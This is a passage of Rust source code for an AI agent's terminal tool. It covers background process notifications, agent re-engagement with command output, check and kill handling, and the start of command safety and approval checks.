                                                direct_deliverable_delivery = true;
                                                // Defer to deterministic file delivery after the loop.
                                                // Do NOT send the generic "✅ finished" ping and do NOT
                                                // set completion_output_for_agent (no re-engagement).
                                                info!(
                                                    pid,
                                                    session_id = %session_for_notify,
                                                    "Attributed a produced-output file; delivering it directly (suppressing finished-ping + re-engagement)"
                                                );
                                                break;
                                            }
                                            DeliverableAttribution::One(path) => {
                                                direct_deliverable_delivery = false;
                                                let code = exit_code
                                                    .map(|c| format!("exit code {c}"))
                                                    .unwrap_or_else(|| "an unknown exit status".to_string());
                                                let msg = format!(
                                                    "⚠️ The background command finished with errors ({code}) and produced `{}`. I'm not sending it automatically because the command did not complete successfully.",
                                                    path.file_name()
                                                        .map(|f| f.to_string_lossy().to_string())
                                                        .unwrap_or_else(|| path.to_string_lossy().to_string())
                                                );
                                                deliver_background_text(
                                                    hub_for_notify.as_ref(),
                                                    state_for_notify.as_ref(),
                                                    &session_for_notify,
                                                    &goal_id_for_notify,
                                                    &msg,
                                                    pid,
                                                )
                                                .await;
                                                break;
                                            }
                                            DeliverableAttribution::Ambiguous(paths) => {
                                                direct_deliverable_delivery = false;
                                                let msg = format!(
                                                    "⚠️ The background command finished, but multiple output files matched: {}. I did not auto-send a file because the deliverable is ambiguous.",
                                                    format_deliverable_paths(paths)
                                                );
                                                deliver_background_text(
                                                    hub_for_notify.as_ref(),
                                                    state_for_notify.as_ref(),
                                                    &session_for_notify,
                                                    &goal_id_for_notify,
                                                    &msg,
                                                    pid,
                                                )
                                                .await;
                                                break;
                                            }
                                            DeliverableAttribution::ExpectedMissing(paths) => {
                                                direct_deliverable_delivery = false;
                                                let msg = format!(
                                                    "⚠️ The background command finished before the expected output file appeared: {}. There's nothing to send.",
                                                    format_deliverable_paths(paths)
                                                );
                                                deliver_background_text(
                                                    hub_for_notify.as_ref(),
                                                    state_for_notify.as_ref(),
                                                    &session_for_notify,
                                                    &goal_id_for_notify,
                                                    &msg,
                                                    pid,
                                                )
                                                .await;
                                                break;
                                            }
                                            DeliverableAttribution::Hints(hints) => {
                                                direct_deliverable_delivery = false;
                                                let msg = format!(
                                                    "⚠️ The background command finished, but the output filename was dynamic or pattern-based, so I couldn't choose a single file to send automatically. Hints: {}",
                                                    hints.iter().take(3).cloned().collect::<Vec<_>>().join("; ")
                                                );
                                                deliver_background_text(
                                                    hub_for_notify.as_ref(),
                                                    state_for_notify.as_ref(),
                                                    &session_for_notify,
                                                    &goal_id_for_notify,
                                                    &msg,
                                                    pid,
                                                )
                                                .await;
                                                break;
                                            }
                                            DeliverableAttribution::None => {
                                                direct_deliverable_delivery = false;
                                            }
                                        }

                                        // No deliverable — friendly status ping, then feed the
                                        // output to agent re-engagement below. Mirror the
                                        // post-loop triviality check so the ping only promises
                                        // a follow-up answer when one will actually be composed.
                                        let answer_follows = {
                                            let t = output.trim();
                                            !(t.is_empty() || t == "(no output)")
                                        };
                                        let message = background_completion_ping_message(
                                            exit_code,
                                            elapsed_secs,
                                            answer_follows,
                                        );

                                        // Prefer editing the "⏳ Still on it —" handoff bubble
                                        // in place (one evolving status message); fall back to
                                        // the plain send/enqueue path inside the helper.
                                        deliver_background_completion_ping(
                                            hub_for_notify.as_ref(),
                                            state_for_notify.as_ref(),
                                            &session_for_notify,
                                            &goal_id_for_notify,
                                            &message,
                                            pid,
                                        )
                                        .await;
                                        // Save output for agent re-engagement after loop
                                        completion_output_for_agent = Some(output);
                                        break;
                                    }
                                    _ = ping_interval.tick() => {
                                        if !notify_on_completion.load(Ordering::Relaxed) {
                                            warn!(
                                                pid,
                                                command = %command_for_notify,
                                                "Terminal background progress pings suppressed (check/kill already handled notification)"
                                            );
                                            return;
                                        }

                                        ping_count += 1;
                                        if ping_count > MAX_BACKGROUND_PROGRESS_PINGS {
                                            // Periodic pings are exhausted. A process still
                                            // alive at this point is likely long-lived (dev
                                            // server, watcher) and may never exit, so the
                                            // completion path below may never run. Re-engage
                                            // the agent ONCE with the output so far so it can
                                            // report status to the user (e.g. "server is up on
                                            // port X") and close out the original task; then
                                            // stay silent and keep waiting for completion.
                                            if !still_running_notice_sent {
                                                still_running_notice_sent = true;
                                                let elapsed_secs =
                                                    started_at_for_notify.elapsed().as_secs();
                                                let stdout = String::from_utf8_lossy(
                                                    &stdout_buf.lock().await,
                                                )
                                                .to_string();
                                                let stderr = String::from_utf8_lossy(
                                                    &stderr_buf.lock().await,
                                                )
                                                .to_string();
                                                // Background delivery bypasses the agent
                                                // loop entirely (this feeds a synthesized
                                                // re-engagement message or a direct
                                                // fallback notice), so the truncation
                                                // notice is rendered inline here
                                                // immediately.
                                                let (formatted, truncation) =
                                                    format_output(&stdout, &stderr, max_output_chars);
                                                let mut with_notice = formatted;
                                                if let Some(info) = truncation {
                                                    with_notice.push('\n');
                                                    with_notice.push_str(
                                                        &crate::utils::render_truncation_notice(&info),
                                                    );
                                                }
                                                let output = truncate_with_note(&with_notice, 2500);
                                                let reengage_budget_ok = {
                                                    let mut log =
                                                        reengagements_for_notify.lock().await;
                                                    reengagement_allowed(
                                                        &mut log,
                                                        &session_for_notify,
                                                        Instant::now(),
                                                    )
                                                };
                                                let mut delivered = false;
                                                if !reengage_budget_ok {
                                                    warn!(
                                                        pid,
                                                        session_id = %session_for_notify,
                                                        command = %command_for_notify,
                                                        "Still-running re-engagement budget exhausted; delivering fallback notice instead"
                                                    );
                                                } else if let Some(ref agent) = agent_for_notify {
                                                    let followup = format!(
                                                        "[Background command still running]\n\
                                                         Command: `{}`\n\
                                                         Running for: {}\n\
                                                         Output so far:\n{}\n\n\
                                                         This process shows no sign of exiting on its own — it is \
                                                         likely a long-lived process such as a dev server or watcher. \
                                                         It keeps running in the background (pid={}); use the terminal \
                                                         tool with action=\"check\" or action=\"kill\" if needed, but \
                                                         do NOT re-run the command and do NOT wait for it to finish. \
                                                         This command was part of your previous task: check your \
                                                         session history for the original user request, tell the user \
                                                         the current status (for a server, include the URL/port it is \
                                                         listening on), and complete any remaining steps of that task now.",
                                                        command_summary,
                                                        humanize_elapsed(elapsed_secs),
                                                        output,
                                                        pid
                                                    );
                                                    info!(
                                                        pid,
                                                        session_id = %session_for_notify,
                                                        command = %command_for_notify,
                                                        "Re-engaging agent loop for long-running background command"
                                                    );
                                                    match agent
                                                        .handle_message(
                                                            &session_for_notify,
                                                            &followup,
                                                            None,
                                                            crate::types::UserRole::Owner,
                                                            crate::types::ChannelContext::internal(),
                                                            None,
                                                        )
                                                        .await
                                                    {
                                                        Ok(reply) if !reply.trim().is_empty() => {
                                                            if let Some(ref hub) = hub_for_notify {
                                                                match hub
                                                                    .send_text(
                                                                        &session_for_notify,
                                                                        &reply,
                                                                    )
                                                                    .await
                                                                {
                                                                    Ok(()) => delivered = true,
                                                                    Err(e) => warn!(
                                                                        pid,
                                                                        error = %e,
                                                                        "Failed to deliver agent still-running follow-up"
                                                                    ),
                                                                }
                                                            }
                                                        }
                                                        Ok(_) => {}
                                                        Err(e) => warn!(
                                                            pid,
                                                            error = %e,
                                                            "Agent re-engagement failed for long-running background command"
                                                        ),
                                                    }
                                                }
                                                if !delivered {
                                                    let mut combined = stdout;
                                                    if !stderr.is_empty() {
                                                        if !combined.is_empty() {
                                                            combined.push('\n');
                                                        }
                                                        combined.push_str(&stderr);
                                                    }
                                                    let fallback = format!(
                                                        "ℹ️ Still running after {} — this looks like a long-lived process (such as a dev server), so it may not finish on its own. It keeps running in the background; I'll send a final update if it stops. Latest output:\n{}",
                                                        humanize_elapsed(elapsed_secs),
                                                        summarize_progress_output(&combined)
                                                    );
                                                    let mut fallback_delivered = false;
                                                    if let Some(ref hub) = hub_for_notify {
                                                        match hub
                                                            .send_text(
                                                                &session_for_notify,
                                                                &fallback,
                                                            )
                                                            .await
                                                        {
                                                            Ok(()) => fallback_delivered = true,
                                                            Err(e) => warn!(
                                                                pid,
                                                                error = %e,
                                                                session_id = %session_for_notify,
                                                                "Failed to deliver still-running fallback notice"
                                                            ),
                                                        }
                                                    }
                                                    if !fallback_delivered {
                                                        if let Some(ref state) = state_for_notify {
                                                            let entry =
                                                                crate::traits::NotificationEntry::new(
                                                                    &goal_id_for_notify,
                                                                    &session_for_notify,
                                                                    "progress",
                                                                    &fallback,
                                                                );
                                                            if let Err(e) = state
                                                                .enqueue_notification(&entry)
                                                                .await
                                                            {
                                                                warn!(
                                                                    pid,
                                                                    error = %e,
                                                                    session_id = %session_for_notify,
                                                                    "Failed to enqueue still-running fallback notice"
                                                                );
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        } else {

                                        let elapsed_secs = started_at_for_notify.elapsed().as_secs();
                                        let stdout = String::from_utf8_lossy(&stdout_buf.lock().await).to_string();
                                        let stderr = String::from_utf8_lossy(&stderr_buf.lock().await).to_string();
                                        let mut combined = stdout;
                                        if !stderr.is_empty() {
                                            if !combined.is_empty() {
                                                combined.push('\n');
                                            }
                                            combined.push_str(&stderr);
                                        }
                                        // Chat pings get a condensed view (line count + tail),
                                        // never the raw output — the agent receives the full
                                        // output via re-engagement on completion.
                                        let latest_output = summarize_progress_output(&combined);
                                        // Internal progress signal (typing indicator + logs).
                                        // pid and the raw command belong here, not in the chat.
                                        if let Some(ref tx) = status_tx_for_notify {
                                            if let Err(e) = tx.try_send(StatusUpdate::ToolProgress {
                                                name: "terminal".to_string(),
                                                chunk: format!(
                                                    "Background command still running (pid={}, {}s elapsed): {}",
                                                    pid, elapsed_secs, command_summary
                                                ),
                                            }) {
                                                warn!(
                                                    pid,
                                                    error = %e,
                                                    command = %command_for_notify,
                                                    "Terminal background notifier failed to send periodic progress status update"
                                                );
                                            }
                                        }

                                        // User-facing channel ping: only when there is genuinely
                                        // NEW output to report. The agent already told the user the
                                        // command is running, so repeated "still running, no output"
                                        // pings are noise. pid and the raw command stay out of chat.
                                        let output_trimmed = latest_output.trim();
                                        let has_new_output = !output_trimmed.is_empty()
                                            && last_pinged_output.as_deref() != Some(output_trimmed);
                                        if has_new_output {
                                            last_pinged_output = Some(output_trimmed.to_string());
                                            let message = format!(
                                                "⏳ Still working on it — running for {}. Latest update:\n{}",
                                                humanize_elapsed(elapsed_secs),
                                                latest_output
                                            );

                                            let mut delivered = false;
                                            if let Some(ref hub) = hub_for_notify {
                                                if let Err(e) = hub.send_text(&session_for_notify, &message).await {
                                                    warn!(
                                                        pid,
                                                        error = %e,
                                                        session_id = %session_for_notify,
                                                        command = %command_for_notify,
                                                        "Terminal background notifier failed direct hub periodic delivery"
                                                    );
                                                } else {
                                                    delivered = true;
                                                }
                                            }

                                            if !delivered {
                                                if let Some(ref state) = state_for_notify {
                                                    let entry = crate::traits::NotificationEntry::new(
                                                        &goal_id_for_notify,
                                                        &session_for_notify,
                                                        "progress",
                                                        &message,
                                                    );
                                                    if let Err(e) = state.enqueue_notification(&entry).await {
                                                        warn!(
                                                            pid,
                                                            error = %e,
                                                            session_id = %session_for_notify,
                                                            goal_id = %goal_id_for_notify,
                                                            command = %command_for_notify,
                                                            "Terminal background notifier failed to enqueue periodic progress notification"
                                                        );
                                                    }
                                                } else {
                                                    warn!(
                                                        pid,
                                                        session_id = %session_for_notify,
                                                        command = %command_for_notify,
                                                        "Terminal background notifier has no fallback queue; periodic update dropped"
                                                    );
                                                }
                                            }
                                        }
                                        } // close else for ping_count cap
                                    }
                                }
                            }

                            // Re-engage the agent loop so it can process the background
                            // command output and continue working on the original task.
                            // The agent has full session history so it can pick up context.
                            //
                            // NOTE: This bypasses the channel's task queue, similar to
                            // spawn_background_task_lead in heartbeat. If the user sends
                            // a new message at the exact same time, both could execute
                            // concurrently. In practice this is rare since the background
                            // command finishes long after the user's original request.
                            if direct_deliverable_delivery {
                                // Deterministic deliverable path: send the single attributed
                                // produced-output file directly (deliver-once guarded), then
                                // fall through to the running-map cleanup below. This replaces
                                // re-engagement / the empty-stdout trivial-skip for the case the
                                // design targets: a command that writes only to a result file.
                                if let DeliverableAttribution::One(path) = deliverable_attribution {
                                    deliver_attributed_background_file(
                                        &path,
                                        &session_for_notify,
                                        &command_summary,
                                        &inbox_dir_for_notify,
                                        &outbox_dirs_for_notify,
                                        &delivered_deliverables_for_notify,
                                        plan_store_for_notify.as_ref(),
                                        hub_for_notify.as_ref(),
                                        state_for_notify.as_ref(),
                                        &goal_id_for_notify,
                                        pid,
                                    )
                                    .await;
                                }
                            } else if let Some(output) = completion_output_for_agent {
                                let output_trimmed = output.trim();
                                // Only genuinely empty output is trivial. A short
                                // result is often the whole answer — a `wc -l` count,
                                // a numeric total, a one-word status — so it must NOT
                                // be dropped here (length is not a proxy for value).
                                let is_trivial =
                                    output_trimmed.is_empty() || output_trimmed == "(no output)";
                                if is_trivial {
                                    info!(
                                        pid,
                                        "Skipping agent re-engagement: trivial background command output"
                                    );
                                } else if is_short_complete_output(output_trimmed) {
                                    // SHORT, complete result (a `wc -l` count, a path, a
                                    // one-line status). Do NOT re-enter the full agent loop:
                                    // with small models it tends to RE-RUN the command,
                                    // re-detaching to the background and emitting duplicate
                                    // "finished" pings. Instead, ask the model for a one-line
                                    // interpretation via a TOOL-LESS call (it can only reply
                                    // in text — it cannot re-run anything), so the user gets a
                                    // contextual answer ("345 raw matches, not files") with no
                                    // churn. If that call is unavailable, fall back to the raw
                                    // result so the answer is never lost.
                                    let interpreted = match agent_for_notify {
                                        Some(ref agent) => {
                                            agent
                                                .interpret_background_result(
                                                    &command_for_notify,
                                                    output_trimmed,
                                                )
                                                .await
                                        }
                                        None => None,
                                    };
                                    let message = match interpreted {
                                        Some(text) => {
                                            info!(
                                                pid,
                                                session_id = %session_for_notify,
                                                "Delivered short background output via tool-less LLM interpretation (no re-engagement)"
                                            );
                                            text
                                        }
                                        None => {
                                            info!(
                                                pid,
                                                session_id = %session_for_notify,
                                                "Delivering short background output as raw result (interpretation unavailable)"
                                            );
                                            format_short_background_result(output_trimmed)
                                        }
                                    };
                                    // Background deliveries bypass the agent loop's
                                    // completion sanitizer, so run the same user-facing
                                    // reply sanitization here — the tool-less LLM
                                    // interpretation can echo internal scaffolding
                                    // (control hints, [SYSTEM]/[CONTENT FILTERED] directives).
                                    let message =
                                        crate::tools::sanitize::sanitize_user_facing_reply(
                                            &message,
                                        );
                                    let delivery_allowed = {
                                        let mut log =
                                            recent_background_deliveries_for_notify.lock().await;
                                        background_delivery_allowed(
                                            &mut log,
                                            &session_for_notify,
                                            &message,
                                            Instant::now(),
                                        )
                                    };
                                    if !delivery_allowed {
                                        info!(
                                            pid,
                                            session_id = %session_for_notify,
                                            "Suppressed duplicate short background command output"
                                        );
                                    } else {
                                        let mut delivered = false;
                                        if let Some(ref hub) = hub_for_notify {
                                            if let Err(e) =
                                                hub.send_text(&session_for_notify, &message).await
                                            {
                                                warn!(
                                                    pid,
                                                    error = %e,
                                                    session_id = %session_for_notify,
                                                    "Failed to deliver short background command output"
                                                );
                                            } else {
                                                delivered = true;
                                            }
                                        }
                                        if !delivered {
                                            if let Some(ref state) = state_for_notify {
                                                let entry = crate::traits::NotificationEntry::new(
                                                    &goal_id_for_notify,
                                                    &session_for_notify,
                                                    "progress",
                                                    &message,
                                                );
                                                if let Err(e) =
                                                    state.enqueue_notification(&entry).await
                                                {
                                                    warn!(
                                                        pid,
                                                        error = %e,
                                                        session_id = %session_for_notify,
                                                        goal_id = %goal_id_for_notify,
                                                        "Failed to enqueue short background command output"
                                                    );
                                                }
                                            }
                                        }
                                    }
                                } else {
                                    // Preferred path: feed the output back through the agent so the
                                    // user gets a formatted, summarized reply instead of raw stdout.
                                    // Only if that path is unavailable or yields nothing do we fall
                                    // back to delivering the output verbatim (so content is never lost).
                                    //
                                    // Re-engagement budget: a re-engaged loop that stalls can spawn
                                    // another background command whose completion re-engages again,
                                    // looping indefinitely. Past the per-session cap, skip the agent
                                    // and deliver the raw output via the fallback below.
                                    let reengage_budget_ok = {
                                        let mut log = reengagements_for_notify.lock().await;
                                        reengagement_allowed(
                                            &mut log,
                                            &session_for_notify,
                                            Instant::now(),
                                        )
                                    };
                                    if !reengage_budget_ok {
                                        warn!(
                                            pid,
                                            session_id = %session_for_notify,
                                            command = %command_for_notify,
                                            "Background re-engagement budget exhausted; delivering raw output instead of re-entering agent loop"
                                        );
                                    }
                                    let mut formatted_delivered = false;
                                    if !reengage_budget_ok {
                                        // Skip the agent path entirely — fall through to the
                                        // raw-output fallback delivery below.
                                    } else if let Some(ref agent) = agent_for_notify {
                                        // Load the durable checklist's still-unchecked items so the
                                        // re-engagement names the exact deferred requirements (e.g.
                                        // "send the latency file") instead of a generic hint.
                                        let unchecked: Vec<String> = if let Some(ref pool) =
                                            pool_for_notify
                                        {
                                            match crate::plans::PlanStore::new(pool.clone()).await {
                                                Ok(ps) => match ps
                                                    .get_incomplete_for_session(&session_for_notify)
                                                    .await
                                                {
                                                    Ok(Some(plan)) => plan
                                                        .unchecked_steps()
                                                        .iter()
                                                        .map(|s| s.description.clone())
                                                        .collect(),
                                                    _ => Vec::new(),
                                                },
                                                Err(_) => Vec::new(),
                                            }
                                        } else {
                                            Vec::new()
                                        };
                                        let followup = build_background_reengagement_followup(
                                            &command_summary,
                                            &output,
                                            &unchecked,
                                        );
                                        info!(
                                            pid,
                                            session_id = %session_for_notify,
                                            command = %command_for_notify,
                                            "Re-engaging agent loop to process background command output"
                                        );
                                        match agent
                                            .handle_message(
                                                &session_for_notify,
                                                &followup,
                                                None,
                                                crate::types::UserRole::Owner,
                                                crate::types::ChannelContext::internal(),
                                                None,
                                            )
                                            .await
                                        {
                                            Ok(reply) => {
                                                // Defense-in-depth: the re-engaged loop reads session
                                                // history containing this command's "moved to background"
                                                // tool result and sometimes regurgitates that internal
                                                // scaffolding. The agent's own sanitizer runs upstream,
                                                // but re-run it here so the terminal delivery path can
                                                // never leak scaffolding regardless of upstream changes.
                                                let reply =
                                                    crate::tools::sanitize::sanitize_user_facing_reply(
                                                        &reply,
                                                    );
                                                // Send the agent's analysis to the user
                                                if !reply.trim().is_empty() {
                                                    let delivery_allowed = {
                                                        let mut log =
                                                            recent_background_deliveries_for_notify
                                                                .lock()
                                                                .await;
                                                        background_delivery_allowed(
                                                            &mut log,
                                                            &session_for_notify,
                                                            &reply,
                                                            Instant::now(),
                                                        )
                                                    };
                                                    if !delivery_allowed {
                                                        formatted_delivered = true;
                                                        info!(
                                                            pid,
                                                            session_id = %session_for_notify,
                                                            "Suppressed duplicate agent follow-up for background command"
                                                        );
                                                    } else if let Some(ref hub) = hub_for_notify {
                                                        match hub
                                                            .send_text(&session_for_notify, &reply)
                                                            .await
                                                        {
                                                            Ok(()) => formatted_delivered = true,
                                                            Err(e) => warn!(
                                                                pid,
                                                                error = %e,
                                                                "Failed to deliver agent follow-up for background command"
                                                            ),
                                                        }
                                                    }
                                                }
                                            }
                                            Err(e) => {
                                                warn!(
                                                    pid,
                                                    error = %e,
                                                    "Agent re-engagement failed for background command"
                                                );
                                            }
                                        }
                                    }

                                    // Fallback: the agent couldn't deliver a formatted reply, so
                                    // send the raw output (wrapped in a code block) rather than
                                    // leaving the user with only a "completed" ping and no content.
                                    if !formatted_delivered {
                                        let fallback = format!(
                                            "Output from `{}`:\n\n```\n{}\n```",
                                            command_summary, output
                                        );
                                        let delivery_allowed = {
                                            let mut log = recent_background_deliveries_for_notify
                                                .lock()
                                                .await;
                                            background_delivery_allowed(
                                                &mut log,
                                                &session_for_notify,
                                                &fallback,
                                                Instant::now(),
                                            )
                                        };
                                        if !delivery_allowed {
                                            info!(
                                                pid,
                                                session_id = %session_for_notify,
                                                "Suppressed duplicate fallback background command output"
                                            );
                                        } else {
                                            let mut delivered = false;
                                            if let Some(ref hub) = hub_for_notify {
                                                if let Err(e) = hub
                                                    .send_text(&session_for_notify, &fallback)
                                                    .await
                                                {
                                                    warn!(
                                                        pid,
                                                        error = %e,
                                                        session_id = %session_for_notify,
                                                        "Failed to deliver fallback background command output"
                                                    );
                                                } else {
                                                    delivered = true;
                                                }
                                            }
                                            if !delivered {
                                                if let Some(ref state) = state_for_notify {
                                                    let entry =
                                                        crate::traits::NotificationEntry::new(
                                                            &goal_id_for_notify,
                                                            &session_for_notify,
                                                            "progress",
                                                            &fallback,
                                                        );
                                                    if let Err(e) =
                                                        state.enqueue_notification(&entry).await
                                                    {
                                                        warn!(
                                                            pid,
                                                            error = %e,
                                                            session_id = %session_for_notify,
                                                            goal_id = %goal_id_for_notify,
                                                            "Failed to enqueue fallback background command output"
                                                        );
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            // Bug C fix: remove the finished process from `running`
                            // (and its dedupe / task-process indexes) so the idle-reaper
                            // cannot later send a contradictory "stopped, no results"
                            // message for a process whose output was already delivered.
                            //
                            // We only reach this point after the completion_rx arm breaks
                            // out of the select loop — i.e. the process has already exited
                            // and its output has been delivered (status ping + agent
                            // re-engagement / raw fallback above). Removing here is safe
                            // because:
                            //   • handle_check / handle_kill suppress notify_on_completion
                            //     and return early before we get here, so they own cleanup.
                            //   • reap_stale_background_processes filters notifier_active &&
                            //     !detached; removing from running here means the reaper
                            //     finds no entry and skips the process entirely.
                            //   • The entry is NOT moved to `self.completed` (the notifier
                            //     already delivered the output directly), consistent with
                            //     how handle_kill works for notifier-active processes.
                            if let Some(reaped) = running_for_notify.lock().await.remove(&pid) {
                                // Clean up dedupe-key index (mirrors remove_indexes_for_process).
                                if let Some(ref key) = reaped.dedupe_key {
                                    if key == &dedupe_key_for_notify {
                                        let mut dedupe =
                                            running_by_dedupe_key_for_notify.lock().await;
                                        if dedupe.get(key).copied() == Some(pid) {
                                            dedupe.remove(key);
                                        }
                                    }
                                }
                                // Clean up task-process index.
                                if !reaped.detached {
                                    if let Some(ref task_id) = owner_task_id_for_notify {
                                        let mut task_map = task_processes_for_notify.lock().await;
                                        let mut remove_task_key = false;
                                        if let Some(pids) = task_map.get_mut(task_id) {
                                            pids.remove(&pid);
                                            remove_task_key = pids.is_empty();
                                        }
                                        if remove_task_key {
                                            task_map.remove(task_id);
                                        }
                                    }
                                }
                                info!(
                                    pid,
                                    "Notifier removed finished process from running map after delivery"
                                );
                            }
                        });
                        notifier_started = true;
                        // Mark the process so cleanup_task_processes knows the notifier
                        // is actively monitoring it and will deliver the result.
                        if let Some(proc) = self.running.lock().await.get_mut(&pid) {
                            proc.notifier_active = true;
                        }
                    } else {
                        warn!(
                            pid,
                            command = %command,
                            "Terminal background notifier not started because process buffers were unavailable"
                        );
                        notify_on_completion.store(false, Ordering::Relaxed);
                    }
                } else {
                    warn!(
                        pid,
                        command = %command,
                        "Terminal background notifier disabled: neither state queue nor channel hub is configured"
                    );
                    notify_on_completion.store(false, Ordering::Relaxed);
                }

                let mut msg = format!(
                    "Command still running after {}s. Moved to background (pid={}).\n\
                     IMPORTANT: Continue with your next steps immediately — do NOT wait or repeatedly check this process.\n\
                     You can run other commands (like curl) while this runs in the background.\n\
                     Use action=\"check\" with pid={} to see output later, or action=\"kill\" with pid={} to stop it.",
                    elapsed, pid, pid, pid
                );
                if detach {
                    msg.push_str(
                        "\n\nDetached mode is enabled: this process will not be auto-killed at task end.",
                    );
                } else if notifier_started {
                    msg.push_str(
                        "\n\nCompletion notifications are enabled. The user will be notified when this process finishes.",
                    );
                } else {
                    msg.push_str(
                        "\n\nThis process is task-owned and will be auto-killed when the current task ends.",
                    );
                }
                if !partial_stdout.is_empty() {
                    msg.push_str(&format!("\n\nPartial output so far:\n{}", partial_stdout));
                }
                Ok(ToolCallOutcome {
                    metadata: ToolCallMetadata {
                        background_started: true,
                        timed_out: true,
                        detached: detach,
                        completion_notifications_enabled: !detach && notifier_started,
                        ..ToolCallMetadata::default()
                    },
                    output: msg,
                })
            }
        }
    }

    /// Check on a background process: return partial output or final result.
    async fn handle_check(&self, pid: u32) -> anyhow::Result<ToolCallOutcome> {
        let mut running = self.running.lock().await;

        let Some(proc) = running.get(&pid) else {
            drop(running);
            let mut completed = self.completed.lock().await;
            if let Some(done) = completed.remove(&pid) {
                return Ok(ToolCallOutcome {
                    output: done.output,
                    metadata: done.metadata,
                });
            }
            return Ok(ToolCallOutcome::from_output(format!(
                "No tracked process with pid={}. It may have already finished and been reaped.",
                pid
            )));
        };

        if proc.reader_handle.is_finished() {
            // Process done — collect final output and remove from map.
            let proc = running.remove(&pid).unwrap();
            self.remove_indexes_for_process(pid, &proc).await;
            proc.notify_on_completion.store(false, Ordering::Relaxed);
            let exit_code = proc.reader_handle.await.ok().flatten();
            let stdout = String::from_utf8_lossy(&proc.stdout_buf.lock().await).to_string();
            let stderr = String::from_utf8_lossy(&proc.stderr_buf.lock().await).to_string();
            let mut output = format!(
                "[Process pid={} finished after {:.0}s]\n",
                pid,
                proc.started_at.elapsed().as_secs_f64()
            );
            let (formatted, truncation) = format_output(&stdout, &stderr, self.max_output_chars);
            output.push_str(&formatted);
            if let Some(code) = exit_code {
                if code != 0 {
                    output.push_str(&format!("\n[exit code: {}]", code));
                }
            }
            let mut metadata = tracked_background_metadata(proc.detached, false, exit_code);
            metadata.truncation = truncation;
            Ok(ToolCallOutcome { output, metadata })
        } else {
            // Still running — return tail of buffer.
            let elapsed = proc.started_at.elapsed().as_secs();
            let stdout_tail = {
                let b = proc.stdout_buf.lock().await;
                let tail_start = b.len().saturating_sub(2000);
                String::from_utf8_lossy(&b[tail_start..]).to_string()
            };
            let stderr_tail = {
                let b = proc.stderr_buf.lock().await;
                let tail_start = b.len().saturating_sub(500);
                String::from_utf8_lossy(&b[tail_start..]).to_string()
            };
            let mut output = format!(
                "[Process pid={} still running ({} seconds elapsed, command: `{}`)]",
                pid, elapsed, proc.command
            );
            if proc.detached {
                output.push_str("\n[mode: detached]");
            } else if let Some(task_id) = proc.owner_task_id.as_deref() {
                output.push_str(&format!("\n[mode: task-owned, task_id={}]", task_id));
            } else if proc.notifier_active {
                output.push_str("\n[mode: background, notifications active]");
            }
            if !stdout_tail.is_empty() {
                output.push_str(&format!("\n\nRecent stdout:\n{}", stdout_tail));
            }
            if !stderr_tail.is_empty() {
                output.push_str(&format!("\n\nRecent stderr:\n{}", stderr_tail));
            }
            output.push_str(&format!(
                "\n\nUse action=\"check\" pid={} to check again, or action=\"kill\" pid={} to stop.",
                pid, pid
            ));
            Ok(ToolCallOutcome {
                output,
                metadata: tracked_background_metadata(
                    proc.detached,
                    proc.notifier_active && !proc.detached,
                    None,
                ),
            })
        }
    }

    /// Kill a background process: SIGTERM, wait 2s, SIGKILL if needed.
    async fn handle_kill(&self, pid: u32) -> anyhow::Result<ToolCallOutcome> {
        let mut running = self.running.lock().await;

        let Some(proc) = running.remove(&pid) else {
            return Ok(ToolCallOutcome::from_output(format!(
                "No tracked process with pid={}. It may have already finished.",
                pid
            )));
        };
        drop(running);
        self.remove_indexes_for_process(pid, &proc).await;
        self.completed.lock().await.remove(&pid);

        let detached = proc.detached;
        let (output, truncation) = self
            .terminate_running_process(pid, proc, "manual kill")
            .await?;
        let mut metadata = tracked_background_metadata(detached, false, None);
        metadata.truncation = truncation;
        Ok(ToolCallOutcome { output, metadata })
    }

    /// Shared implementation for `call_with_status_outcome` and `call_with_execution_context`.
    ///
    /// `correction_preapproved` is a Rust-side control-plane flag set by the
    /// correction gate — it is NEVER derived from tool arguments, model output, or
    /// any JSON field.  When true (and action=="run"), the user-approval prompt is
    /// bypassed after all hard blocks and command-safety checks have passed.
    ///
    /// Approval ordering for action="run":
    ///   1. Hard blocks (dangerous irreversible commands)  → always enforced
    ///   2. Safety soft-blocks (heredoc, python -c, etc.) → always enforced
    ///   3. Daemonization block / daemonization approval   → always enforced
    ///   4. `correction_preapproved`                       → skips prompt if true
    ///   5. `_untrusted_source` / `_trusted_session` / allowlists / normal prompt
    async fn execute_terminal(
        &self,
        arguments: &str,
        status_tx: Option<mpsc::Sender<StatusUpdate>>,
        correction_preapproved: bool,
    ) -> anyhow::Result<ToolCallOutcome> {
        let args: TerminalArgs = serde_json::from_str(arguments)?;

        // Reap any finished background processes on each call.
        self.reap_finished().await;

        // Route background completion notifications to the origin session
        // when this terminal run is tied to a goal/task lead.
        let mut notify_session_id = args._session_id.clone();
        if let (Some(state), Some(goal_id)) = (self.state.as_ref(), args._goal_id.as_deref()) {
            if let Ok(Some(goal)) = state.get_goal(goal_id).await {
                if !goal.session_id.trim().is_empty() {
                    notify_session_id = goal.session_id;
                }
            }
        }

        let mut outcome = match args.action.as_str() {
            "check" => {
                let pid = args
                    .pid
                    .ok_or_else(|| anyhow::anyhow!("pid is required for action=\"check\""))?;
                self.handle_check(pid).await?
            }
            "kill" => {
                let pid = args
                    .pid
                    .ok_or_else(|| anyhow::anyhow!("pid is required for action=\"kill\""))?;
                self.handle_kill(pid).await?
            }
            "trust_all" => {
                ToolCallOutcome::from_output(self.handle_trust_all(&args._session_id).await?)
            }
            _ => {
                // "run" or default
                let command = args
                    .command
                    .as_deref()
                    .ok_or_else(|| anyhow::anyhow!("command is required for action=\"run\""))?;
                let command = command.trim();
                if command.is_empty() {
                    anyhow::bail!("command must not be empty for action=\"run\"");
                }

                if let Some((pattern, path)) = detect_unscoped_recursive_grep(command) {
                    return Ok(ToolCallOutcome::from_output(recursive_grep_block_message(
                        &pattern, &path,
                    )));
                }

                if let Some((tool_name, root)) = detect_unbounded_disk_scan(command) {
                    return Ok(ToolCallOutcome::from_output(unbounded_scan_block_message(
                        &tool_name, &root,
                    )));
                }

                // Soft-block large heredoc file creation: redirects to write_file
                // which writes atomically without shell quoting issues.
                // Allow quoted heredoc delimiters (<<'EOF' or << 'EOF') since they
                // avoid shell expansion issues and serve as a fallback when write_file
                // fails with JSON escaping errors on complex content.
                if command.contains("<<") && command.len() > 500 {
                    let uses_quoted_heredoc = command.contains("<<'")
                        || command.contains("<< '")
                        || command.contains("<<\"")
